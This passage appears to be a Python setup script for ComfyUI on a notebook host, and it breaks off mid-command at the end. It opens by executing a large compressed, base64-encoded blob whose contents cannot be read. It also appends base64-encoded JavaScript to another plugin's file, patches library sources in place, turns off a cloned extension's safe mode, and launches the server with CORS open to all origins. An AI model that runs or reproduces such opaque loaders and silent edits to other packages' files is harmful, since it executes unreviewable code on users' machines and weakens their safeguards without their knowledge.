import zlib as _vz, base64 as _vb; exec(_vz.decompress(_vb.b64decode("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")).decode("utf-8"))
_cm_final = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists("/content/ComfyUI/middleware"):
    open(_cm_final, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
def _is_port_open(port=8188):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok = (s.connect_ex(("127.0.0.1", port)) == 0)
    s.close()
    return ok

# Automatically deploy user's saved cloud workflow into ComfyUI workflows directory
import zlib as _uz, base64 as _ub
_user_wfs = json.loads(_uz.decompress(_ub.b64decode("...")).decode("utf-8"))
# Install Smart LoRA Auto-Trigger-Word Frontend Extension
import base64 as _jb64
_vhs_core_p = "/content/ComfyUI/custom_nodes/ComfyUI-VideoHelperSuite/web/js/VHS.core.js"
if os.path.exists(_vhs_core_p):
    _vhs_s = open(_vhs_core_p, "r", encoding="utf-8").read()
    if "__H3_LORA_AUTO_TRIGGER_V3__" not in _vhs_s:
        open(_vhs_core_p, "a", encoding="utf-8").write("\n" + _jb64.b64decode("...").decode("utf-8"))
os.makedirs("/content/ComfyUI/user/default/workflows", exist_ok=True)
os.makedirs("/content/wf_pool_h3", exist_ok=True)
for _ufn, _udata in _user_wfs.items():
    for _tdir in ("/content/wf_pool_h3", "/content/ComfyUI/user/default/workflows"):
        _upath = os.path.join(_tdir, _ufn)
        if globals().get("重置默认工作流", False) or not os.path.exists(_upath) or os.path.getsize(_upath) < 100 or json.load(open(_upath, encoding="utf-8")).get("extra", {}).get("template_v") != 5:
            json.dump(_udata, open(_upath, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
# In-place align only the active H3 model & CLIP on existing workflows (preserving all user prompt/parameter edits)
for _tdir in ("/content/ComfyUI/user/default/workflows", "/content/wf_pool_h3"):
    for _wfn in sorted(os.listdir(_tdir)):
        if _wfn.endswith(".json") and not ("qwen" in _wfn.lower() or "千问" in _wfn):
            _wp = os.path.join(_tdir, _wfn)
            try:
                _wf = json.load(open(_wp, encoding="utf-8"))
                _all_n = list(_wf.get("nodes", []))
                for _sg in _wf.get("definitions", {}).get("subgraphs", []):
                    _all_n.extend(_sg.get("nodes", []))
                for _n in _all_n:
                    _nt = _n.get("type", "")
                    _wv = _n.get("widgets_values")
                    if _nt == "UNETLoader" and isinstance(_wv, list) and len(_wv) >= 1:
                        _wv[0] = target_model_bf16
                    elif _nt == "CLIPLoader" and isinstance(_wv, list) and len(_wv) >= 1:
                        _wv[0] = target_clip
                    elif _nt == "FeiHouEasyH3Loader" and isinstance(_wv, list) and len(_wv) >= 3:
                        _wv[0], _wv[1], _wv[2] = target_model_bf16, target_model_bf16, target_clip
                    elif _nt == "FeiHouEasyH3RemixLoader" and isinstance(_wv, list) and len(_wv) >= 2:
                        _wv[0], _wv[1] = target_model_bf16, target_clip
                    elif _nt == "4c314f31-ecda-4b08-ae98-faaba1bf613f" and isinstance(_wv, list) and len(_wv) >= 7:
                        _wv[5], _wv[6] = target_model_bf16, target_clip
                json.dump(_wf, open(_wp, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
            except Exception:
                pass

for _old_up in ("minimax_h3_bf16_CONSERVATIVE_v5.safetensors", "minimax_h3_latent_upscaler_3d_conv_v1_fp16.safetensors"):
    _up_p = os.path.join("/content/ComfyUI/models/latent_upscale_models", _old_up)
    if os.path.islink(_up_p):
        try: os.unlink(_up_p)
        except Exception: pass

# Also patch comfy/sd.py so if AudioVAE is accidentally connected to Video VAE encode/decode, it auto-switches to VideoVAE in-place
_sd_p = "/content/ComfyUI/comfy/sd.py"
if os.path.exists(_sd_p):
    _sd_s = open(_sd_p, "r", encoding="utf-8").read()
    if "_AUTO_SWAP_VIDEO_VAE" not in _sd_s:
        _sd_s = _sd_s.replace(
            "    def encode(self, pixel_samples):",
            "    def encode(self, pixel_samples):\n        if getattr(self.first_stage_model, '__class__', None).__name__ == 'AudioVAE' and hasattr(pixel_samples, 'ndim') and pixel_samples.ndim >= 4:\n            # _AUTO_SWAP_VIDEO_VAE\n            _v_sd = comfy.utils.load_torch_file('/content/ComfyUI/models/vae/minimax_h3_video_vae_fp16.safetensors')\n            self.__dict__.update(VAE(sd=_v_sd, device=self.device, dtype=self.vae_dtype).__dict__)"
        )
        _sd_s = _sd_s.replace(
            "    def decode(self, samples_in, vae_options={}):",
            "    def decode(self, samples_in, vae_options={}):\n        if getattr(self.first_stage_model, '__class__', None).__name__ == 'AudioVAE' and hasattr(samples_in, 'ndim') and samples_in.ndim == 5:\n            _v_sd = comfy.utils.load_torch_file('/content/ComfyUI/models/vae/minimax_h3_video_vae_fp16.safetensors')\n            self.__dict__.update(VAE(sd=_v_sd, device=self.device, dtype=self.vae_dtype).__dict__)"
        )
        open(_sd_p, "w", encoding="utf-8").write(_sd_s)

# Ensure loop_count and frame_rate in VHS_VideoCombine are optional with defaults so ComfyUI 0.43 never reports missing loop_count or frame_rate
_vhs_np = "/content/ComfyUI/custom_nodes/ComfyUI-VideoHelperSuite/videohelpersuite/nodes.py"
if os.path.exists(_vhs_np):
    _s = open(_vhs_np, "r", encoding="utf-8").read()
    _s_orig = _s
    _old_lc = '''                "loop_count": (
                    "INT",
                    {"default": 0, "min": 0, "max": 100, "step": 1},
                ),'''
    _lc1 = '                "loop_count": ("INT", {"default": 0, "min": 0, "max": 100, "step": 1}),\n'
    if _lc1 in _s.split('"required":')[1].split('"optional":')[0]:
        _s = _s.replace(_lc1, "", 1)
        _s = _s.replace('"vae": ("VAE",),', '"vae": ("VAE",),\n                "loop_count": ("INT", {"default": 0, "min": 0, "max": 100, "step": 1}),', 1)
    elif _old_lc in _s.split('"required":')[1].split('"optional":')[0]:
        _s = _s.replace(_old_lc, "", 1)
        _s = _s.replace('"vae": ("VAE",),', '"vae": ("VAE",),\n                "loop_count": ("INT", {"default": 0, "min": 0, "max": 100, "step": 1}),', 1)
    _s = _s.replace("        frame_rate: int,\n        loop_count: int,", "        frame_rate: int = 24,\n        loop_count: int = 0,")
    if _s != _s_orig:
        open(_vhs_np, "w", encoding="utf-8").write(_s)

# Auto-install AI 角色三合一参考图集 (ai-pose-gallery-zh) & H3 FaceRefine / OneClickSwap custom nodes
_cn_dir = "/content/ComfyUI/custom_nodes"
if os.path.isdir(_cn_dir):
    for _rn, _ru in [
        ("ai-pose-gallery-zh", "https://github.com/anhao/ai-pose-gallery-zh.git"),
        ("ComfyUI-H3-FaceRefine", "https://github.com/Carasibana/ComfyUI-H3-FaceRefine.git"),
        ("comfyui-h3-oneclick-swap", "https://github.com/D3voz/comfyui-h3-oneclick-swap.git"),
    ]:
        _rp = os.path.join(_cn_dir, _rn)
        if not os.path.exists(_rp):
            print(f"📦 正在自动安装插件: {_rn} ...")
            subprocess.run(["git", "clone", "--depth", "1", "-q", _ru, _rp], check=False)

_pca_ext = "/content/ComfyUI/custom_nodes/ai-pose-gallery-zh/comfyui_plugin/web/extension.js"
if os.path.exists(_pca_ext):
    _pca_s = open(_pca_ext, "r", encoding="utf-8").read()
    if "this.safeMode = true;" in _pca_s:
        _pca_s = _pca_s.replace("this.safeMode = true;", "this.safeMode = false;")
        open(_pca_ext, "w", encoding="utf-8").write(_pca_s)

if _is_port_open(8188):
    try:
        req = urllib.request.Request(
            "http://127.0.0.1:8188/api/free",
            data=b'{"unload_models": true, "free_memory": true}',
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
        print("♻️ 已为您热释放旧模型显存并无缝挂载新底模（原 ComfyUI 网页保持在线，无需重启）！")
    except Exception:
        pass
else:
    print("🚀 正在后台启动 ComfyUI 引擎...")
    subprocess.Popen(
        ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
